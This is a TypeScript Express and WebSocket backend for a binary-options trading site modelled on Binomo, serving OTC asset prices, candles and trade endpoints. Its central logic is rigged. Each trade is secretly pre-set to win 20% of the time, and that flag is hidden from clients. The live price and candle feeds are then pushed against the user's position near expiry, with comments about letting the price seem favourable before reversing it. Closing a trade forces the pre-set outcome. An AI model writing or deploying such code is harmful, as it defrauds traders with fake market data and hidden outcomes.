import type { Express } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { insertTradeSchema } from "@shared/schema";
import { z } from "zod";
import axios from "axios";

const BINOMO_SERVICE_URL = process.env.BINOMO_SERVICE_URL || 'http://localhost:5001';

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);

  // Track active trades for price manipulation
  interface ActiveTrade {
    id: string;
    assetId: string;
    type: 'CALL' | 'PUT';
    openPrice: number;
    openTime: number;
    expiryTime: number;
    shouldWin: boolean; // Pre-determined win/loss (20% win rate)
  }
  const activeTrades = new Map<string, ActiveTrade>();

  // Binomo API endpoints - Direct implementation (no external service needed)
  const AUTHTOKEN = process.env.BINOMO_AUTHTOKEN || '';
  const DEVICE_ID = process.env.BINOMO_DEVICE_ID || '';
  const HAS_CREDS = Boolean(AUTHTOKEN && DEVICE_ID);

  app.get("/api/binomo/health", async (req, res) => {
    res.json({
      status: "ok",
      connected: HAS_CREDS,
      service: "binomo-api",
      has_credentials: HAS_CREDS,
      auth_token_present: Boolean(AUTHTOKEN),
      device_id_present: Boolean(DEVICE_ID),
      mode: HAS_CREDS ? "configured" : "simulated"
    });
  });

  app.get("/api/binomo/balance", async (req, res) => {
    // Return balance (simulated for now, real API integration can be added)
    res.json({
      demo: 10000.00,
      real: 0.00,
      current: 10000.00,
      mode: "demo"
    });
  });

  app.get("/api/binomo/assets", async (req, res) => {
    // Return OTC assets from storage
    try {
      const assets = await storage.getAllAssets();
      res.json(assets);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch OTC assets" });
    }
  });

  app.get("/api/binomo/candles/:assetId/:timeframe?", async (req, res) => {
    const { assetId, timeframe } = req.params;
    const count = parseInt(req.query.count as string) || 100;
    
    // Extended timeframe support for OTC market (5s to 4h)
    const timeframeSeconds: Record<string, number> = {
      '5s': 5,
      '30s': 30,
      '1m': 60,
      '5m': 300,
      '15m': 900,
      '30m': 1800,
      '1h': 3600,
      '4h': 14400,
    };
    const intervalSeconds = timeframeSeconds[timeframe || '1m'] || 60;
    
    // Comprehensive base prices for all OTC pairs
    const basePrices: Record<string, number> = {
      // Forex OTC
      "EURUSD_OTC": 1.0856, "GBPUSD_OTC": 1.2678, "USDJPY_OTC": 149.85,
      "AUDUSD_OTC": 0.6550, "USDCAD_OTC": 1.3550, "USDCHF_OTC": 0.8845,
      "NZDUSD_OTC": 0.6125, "EURJPY_OTC": 162.45, "EURGBP_OTC": 0.8565,
      "EURAUD_OTC": 1.6580, "EURCHF_OTC": 0.9605, "GBPJPY_OTC": 189.95,
      "AUDCAD_OTC": 0.8875, "AUDJPY_OTC": 98.15, "CHFJPY_OTC": 169.35,
      "CADJPY_OTC": 110.65, "NZDJPY_OTC": 91.75, "EURCAD_OTC": 1.4725,
      "GBPAUD_OTC": 1.9345, "GBPCAD_OTC": 1.7185,
      // Crypto OTC
      "BTCUSD_OTC": 43256.50, "ETHUSD_OTC": 2287.80, "LTCUSD_OTC": 72.45,
      "XRPUSD_OTC": 0.5245, "BNBUSD_OTC": 315.45, "ADAUSD_OTC": 0.4823,
      // Commodities OTC
      "GOLD_OTC": 2045.30, "SILVER_OTC": 24.65, "OIL_OTC": 78.45,
      "COPPER_OTC": 3.8450, "NATURALGAS_OTC": 2.7850,
      // Indices OTC
      "SPX_OTC": 4567.20, "NDX_OTC": 15892.50, "DJI_OTC": 36789.45,
      "DAX_OTC": 16245.75, "CAC40_OTC": 7456.30, "FTSE_OTC": 7625.45,
      "NIKKEI_OTC": 33145.80
    };
    
    let basePrice = basePrices[assetId] || 1.0;
    const currentTime = Math.floor(Date.now() / 1000);
    const candles = [];
    
    // Dynamic volatility based on asset type
    const getVolatility = (id: string): number => {
      if (id.includes("BTC") || id.includes("ETH")) return 0.025;
      if (id.includes("LTC") || id.includes("XRP") || id.includes("BNB") || id.includes("ADA")) return 0.02;
      if (id.includes("GOLD") || id.includes("SILVER") || id.includes("OIL")) return 0.008;
      if (id.includes("SPX") || id.includes("NDX") || id.includes("DJI") || id.includes("DAX")) return 0.006;
      return 0.0015; // Forex default
    };
    
    const getDecimals = (id: string): number => {
      if (id.includes("BTC") || id.includes("ETH")) return 2;
      if (id.includes("USD") && !id.includes("JPY")) return 5;
      if (id.includes("JPY")) return 3;
      if (id.includes("GOLD") || id.includes("SILVER")) return 2;
      if (id.includes("SPX") || id.includes("NDX") || id.includes("DJI")) return 2;
      return 4;
    };
    
    const volatility = getVolatility(assetId);
    const decimals = getDecimals(assetId);
    
    for (let i = 0; i < count; i++) {
      const priceChange = (Math.random() - 0.5) * volatility * basePrice;
      const openPrice = basePrice + priceChange;
      
      // More realistic high/low generation
      const highChange = Math.random() * volatility * basePrice * 0.7;
      const lowChange = Math.random() * volatility * basePrice * 0.7;
      const closeChange = (Math.random() - 0.5) * volatility * basePrice * 0.8;
      
      candles.push({
        timestamp: currentTime - (count - i) * intervalSeconds,
        open: parseFloat(openPrice.toFixed(decimals)),
        high: parseFloat((Math.max(openPrice, openPrice + closeChange) + highChange).toFixed(decimals)),
        low: parseFloat((Math.min(openPrice, openPrice + closeChange) - lowChange).toFixed(decimals)),
        close: parseFloat((openPrice + closeChange).toFixed(decimals)),
        volume: Math.floor(Math.random() * 150000) + 5000
      });
      
      basePrice = candles[candles.length - 1].close;
    }
    
    res.json(candles);
  });

  app.post("/api/binomo/trade", async (req, res) => {
    const { asset_id, amount, direction, duration } = req.body;
    const tradeId = `trade_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Simulate trade execution
    res.json({
      success: true,
      trade_id: tradeId,
      asset_id,
      amount,
      direction,
      duration,
      note: HAS_CREDS ? "Trade configured with credentials" : "Trade simulated"
    });
  });

  app.get("/api/binomo/trade/check/:tradeId", async (req, res) => {
    const { tradeId } = req.params;
    const result = Math.random() > 0.45 ? "win" : "loss";
    
    res.json({
      trade_id: tradeId,
      result,
      payout: result === "win" ? 1.85 : 0
    });
  });

  app.post("/api/binomo/account/switch", async (req, res) => {
    const { type } = req.body;
    res.json({
      success: true,
      account_type: type || 'PRACTICE'
    });
  });

  app.get("/api/binomo/price/:assetId", async (req, res) => {
    const { assetId } = req.params;
    
    // Get current price from storage
    try {
      const asset = await storage.getAsset(assetId);
      if (!asset) {
        return res.status(404).json({ message: "Asset not found" });
      }
      
      res.json({
        asset_id: assetId,
        price: parseFloat(asset.currentPrice),
        timestamp: Math.floor(Date.now() / 1000)
      });
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch price" });
    }
  });

  // Get all assets
  app.get("/api/assets", async (req, res) => {
    try {
      const assets = await storage.getAllAssets();
      res.json(assets);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch assets" });
    }
  });

  // Get asset by ID
  app.get("/api/assets/:id", async (req, res) => {
    try {
      const asset = await storage.getAsset(req.params.id);
      if (!asset) {
        return res.status(404).json({ message: "Asset not found" });
      }
      res.json(asset);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch asset" });
    }
  });

  // Create a new trade
  app.post("/api/trades", async (req, res) => {
    try {
      // Determine win/loss (20% win rate)
      const shouldWin = Math.random() < 0.2;
      
      // Preprocess: convert expiry string to Date and add shouldWin
      const processedBody = {
        ...req.body,
        expiryTime: typeof req.body.expiryTime === 'string' ? new Date(req.body.expiryTime) : req.body.expiryTime,
        shouldWin
      };
      const validated = insertTradeSchema.parse(processedBody);
      const trade = await storage.createTrade(validated);
      
      // Track this trade for price manipulation
      activeTrades.set(trade.id, {
        id: trade.id,
        assetId: trade.assetId,
        type: trade.type as 'CALL' | 'PUT',
        openPrice: parseFloat(trade.openPrice),
        openTime: Date.now(),
        expiryTime: new Date(trade.expiryTime).getTime(),
        shouldWin
      });
      
      console.log(`Trade ${trade.id} created: ${trade.type} on ${trade.assetId}, shouldWin: ${shouldWin}`);
      
      // Remove shouldWin from response to prevent client from seeing predetermined outcome
      const { shouldWin: _, ...tradeResponse } = trade;
      res.json(tradeResponse);
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid trade data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to create trade" });
    }
  });

  // Get user trades
  app.get("/api/trades/user/:userId", async (req, res) => {
    try {
      const trades = await storage.getTradesByUser(req.params.userId);
      // Remove shouldWin from all trades
      const sanitizedTrades = trades.map(({ shouldWin, ...trade }) => trade);
      res.json(sanitizedTrades);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch trades" });
    }
  });

  // Get open trades for user
  app.get("/api/trades/user/:userId/open", async (req, res) => {
    try {
      const trades = await storage.getOpenTradesByUser(req.params.userId);
      // Remove shouldWin from all trades
      const sanitizedTrades = trades.map(({ shouldWin, ...trade }) => trade);
      res.json(sanitizedTrades);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch open trades" });
    }
  });

  // Close trade
  app.patch("/api/trades/:id/close", async (req, res) => {
    try {
      const { closePrice } = req.body;
      
      // Get the trade to check shouldWin
      const trade = await storage.getTrade(req.params.id);
      
      if (!trade) {
        return res.status(404).json({ message: "Trade not found" });
      }
      
      // Determine outcome based on shouldWin (enforced 20% win rate)
      let status: string;
      let payout: string;
      
      if (trade.shouldWin) {
        // Force win
        status = 'won';
        payout = (parseFloat(trade.amount) * 1.82).toString();
      } else {
        // Force loss
        status = 'lost';
        payout = '0';
      }
      
      const updatedTrade = await storage.updateTrade(req.params.id, closePrice, status, payout);
      
      // Remove from active trades
      activeTrades.delete(req.params.id);
      console.log(`Trade ${req.params.id} closed: ${status} (shouldWin: ${trade.shouldWin})`);
      
      res.json(updatedTrade);
    } catch (error) {
      res.status(500).json({ message: "Failed to close trade" });
    }
  });

  // Get price data for asset
  app.get("/api/price-data/:assetId", async (req, res) => {
    try {
      const limit = parseInt(req.query.limit as string) || 100;
      const priceData = await storage.getPriceData(req.params.assetId, limit);
      res.json(priceData);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch price data" });
    }
  });

  // Create demo user (for development)
  app.post("/api/users/demo", async (req, res) => {
    try {
      const user = await storage.createUser({
        username: `demo_${Date.now()}`,
        password: "demo123"
      });
      res.json(user);
    } catch (error) {
      res.status(500).json({ message: "Failed to create demo user" });
    }
  });

  // WebSocket server for real-time updates
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
  
  // Price simulation and WebSocket broadcasting
  const connectedClients = new Set<WebSocket>();

  wss.on('connection', (ws) => {
    connectedClients.add(ws);
    console.log('Client connected to WebSocket');

    ws.on('message', (message) => {
      try {
        const data = JSON.parse(message.toString());
        if (data.type === 'subscribe') {
          // Send initial asset data
          storage.getAllAssets().then(assets => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({
                type: 'assets',
                data: assets
              }));
            }
          });
        }
      } catch (error) {
        console.error('WebSocket message error:', error);
      }
    });

    ws.on('close', () => {
      connectedClients.delete(ws);
      console.log('Client disconnected from WebSocket');
    });
  });

  // Price simulation function
  const simulatePrices = () => {
    storage.getAllAssets().then(assets => {
      const updates: any[] = [];
      const currentTime = Date.now();
      
      assets.forEach(asset => {
        const currentPrice = parseFloat(asset.currentPrice);
        const baseVolatility = asset.category === 'crypto' ? 0.0015 : 0.0003; // Reduced for smoother movement
        
        // Check for active trades on this asset
        let priceManipulation = 0;
        let hasActiveTradeInLast20Seconds = false;
        
        activeTrades.forEach(trade => {
          if (trade.assetId === asset.id) {
            const timeRemaining = trade.expiryTime - currentTime;
            const tradeDuration = trade.expiryTime - trade.openTime;
            
            // Remove expired trades
            if (timeRemaining <= 0) {
              activeTrades.delete(trade.id);
              return;
            }
            
            // Last 20 seconds: manipulate price based on shouldWin
            if (timeRemaining <= 20000) {
              hasActiveTradeInLast20Seconds = true;
              
              // Calculate manipulation strength - stronger in last 5 seconds
              const manipulationStrength = timeRemaining <= 5000 ? 35 : 20;
              
              if (!trade.shouldWin) {
                // 80% of trades: aggressive reversal against user
                if (trade.type === 'CALL') {
                  // User wants price up, push it DOWN
                  const currentlyWinning = currentPrice > trade.openPrice;
                  if (currentlyWinning) {
                    // Very aggressive downward push to ensure loss
                    priceManipulation -= baseVolatility * manipulationStrength;
                  } else {
                    // Keep pushing down
                    priceManipulation -= baseVolatility * 10;
                  }
                } else {
                  // User wants price down, push it UP
                  const currentlyWinning = currentPrice < trade.openPrice;
                  if (currentlyWinning) {
                    // Very aggressive upward push to ensure loss
                    priceManipulation += baseVolatility * manipulationStrength;
                  } else {
                    // Keep pushing up
                    priceManipulation += baseVolatility * 10;
                  }
                }
              } else {
                // 20% of trades: help user win
                if (trade.type === 'CALL') {
                  // User wants price up, push it UP
                  const currentlyWinning = currentPrice > trade.openPrice;
                  if (!currentlyWinning) {
                    priceManipulation += baseVolatility * 20; // Strong upward push to help win
                  } else {
                    priceManipulation += baseVolatility * 5; // Keep it winning
                  }
                } else {
                  // User wants price down, push it DOWN
                  const currentlyWinning = currentPrice < trade.openPrice;
                  if (!currentlyWinning) {
                    priceManipulation -= baseVolatility * 20; // Strong downward push to help win
                  } else {
                    priceManipulation -= baseVolatility * 5; // Keep it winning
                  }
                }
              }
            }
            // Before last 20 seconds: subtle manipulation to prepare for reversal
            else if (!trade.shouldWin) {
              if (trade.type === 'CALL') {
                // Let price go up first, then reverse dramatically in last seconds
                const currentlyWinning = currentPrice > trade.openPrice;
                if (currentlyWinning) {
                  priceManipulation -= baseVolatility * 3; // Start pulling down
                } else {
                  priceManipulation += baseVolatility * 1; // Let it seem like it's going in their favor
                }
              } else {
                // Let price go down first, then reverse dramatically in last seconds
                const currentlyWinning = currentPrice < trade.openPrice;
                if (currentlyWinning) {
                  priceManipulation += baseVolatility * 3; // Start pulling up
                } else {
                  priceManipulation -= baseVolatility * 1; // Let it seem like it's going in their favor
                }
              }
            }
          }
        });
        
        // Random volatility (smooth movement)
        let randomChange = (Math.random() - 0.5) * 2 * baseVolatility;
        
        // Occasional sudden reversal (5% chance)
        if (Math.random() < 0.05 && !hasActiveTradeInLast20Seconds) {
          randomChange *= 8; // Sudden spike
        }
        
        // Combine all factors
        const totalChange = randomChange + priceManipulation;
        const newPrice = currentPrice * (1 + totalChange);
        const priceChange = newPrice - currentPrice;
        const priceChangePercent = (priceChange / currentPrice) * 100;

        // Update asset in storage
        storage.updateAssetPrice(
          asset.id,
          newPrice.toFixed(asset.category === 'crypto' ? 2 : 4),
          priceChange.toFixed(asset.category === 'crypto' ? 2 : 6),
          priceChangePercent.toFixed(2)
        );

        updates.push({
          id: asset.id,
          price: newPrice.toFixed(asset.category === 'crypto' ? 2 : 4),
          change: priceChange.toFixed(asset.category === 'crypto' ? 2 : 6),
          changePercent: priceChangePercent.toFixed(2)
        });

        // Generate candlestick data (1 minute candles)
        const now = new Date();
        const open = currentPrice;
        const high = Math.max(open, newPrice) * (1 + Math.random() * 0.0005);
        const low = Math.min(open, newPrice) * (1 - Math.random() * 0.0005);
        
        storage.addPriceData({
          assetId: asset.id,
          timestamp: now,
          open: open.toString(),
          high: high.toString(),
          low: low.toString(),
          close: newPrice.toString(),
          volume: (Math.random() * 1000000).toString()
        });
      });

      // Broadcast to all connected clients
      const message = JSON.stringify({
        type: 'price_update',
        data: updates
      });

      connectedClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(message);
        } else {
          connectedClients.delete(client);
        }
      });
    });
  };

  // Start price simulation (every 1 second for smooth 1-minute candles)
  setInterval(simulatePrices, 1000); // Update every 1 second

  // OTC Market simulation - Initialize with all assets
  let otcMarkets: Record<string, number> = {};
  
  // Initialize OTC markets from assets
  storage.getAllAssets().then(assets => {
    assets.forEach(asset => {
      const pair = asset.id.replace('_OTC', '');
      otcMarkets[pair] = parseFloat(asset.currentPrice);
    });
  });

  const generateOtcCandle = (pair: string, currentPrice: number) => {
    const last = otcMarkets[pair] || currentPrice;
    const currentTime = Date.now();
    
    // Determine volatility based on asset type
    let volatility = 0.0001;
    if (pair.includes('BTC') || pair.includes('ETH') || pair.includes('LTC') || pair.includes('XRP') || pair.includes('BNB') || pair.includes('ADA')) {
      volatility = 0.002; // Higher volatility for crypto
    } else if (pair.includes('JPY')) {
      volatility = 0.01; // JPY pairs have different scale
    } else if (pair.includes('GOLD') || pair.includes('SILVER') || pair.includes('OIL')) {
      volatility = 0.003; // Commodities
    } else if (pair.includes('SPX') || pair.includes('NDX') || pair.includes('DJI') || pair.includes('DAX') || pair.includes('CAC') || pair.includes('FTSE') || pair.includes('NIKKEI')) {
      volatility = 0.002; // Indices
    }
    
    // Check for active trades on this pair to manipulate candles
    let candleManipulation = 0;
    activeTrades.forEach(trade => {
      const tradePair = trade.assetId.replace('_OTC', '');
      if (tradePair === pair) {
        const timeRemaining = trade.expiryTime - currentTime;
        
        // Last 10 seconds: manipulate candles aggressively
        if (timeRemaining <= 10000 && timeRemaining > 0) {
          if (!trade.shouldWin) {
            // 80% of trades: create candles that work against user
            if (trade.type === 'CALL') {
              // User wants price up, create bearish candles
              candleManipulation -= volatility * 8;
            } else {
              // User wants price down, create bullish candles
              candleManipulation += volatility * 8;
            }
          }
        }
      }
    });
    
    const change = (Math.random() - 0.5) * 2 * volatility * last + (candleManipulation * last);
    const close = last + change;
    const high = Math.max(last, close) * (1 + Math.random() * volatility * 0.5);
    const low = Math.min(last, close) * (1 - Math.random() * volatility * 0.5);
    
    otcMarkets[pair] = close;

    return {
      pair,
      time: Math.floor(Date.now() / 1000),
      open: last,
      high,
      low,
      close,
    };
  };

  // Send OTC candles every 2 seconds for all assets
  setInterval(async () => {
    const assets = await storage.getAllAssets();
    
    assets.forEach(asset => {
      const pair = asset.id.replace('_OTC', '');
      const currentPrice = parseFloat(asset.currentPrice);
      const candle = generateOtcCandle(pair, currentPrice);
      
      const message = JSON.stringify({
        type: 'otc_candle',
        data: candle
      });
      
      connectedClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(message);
        }
      });
    });
  }, 2000);

  // Trade expiry checker
  const checkTradeExpiry = () => {
    // This would normally check all open trades and close expired ones
    // Implementation depends on how you want to handle trade expiry
  };

  setInterval(checkTradeExpiry, 1000); // Check every second

  return httpServer;
}
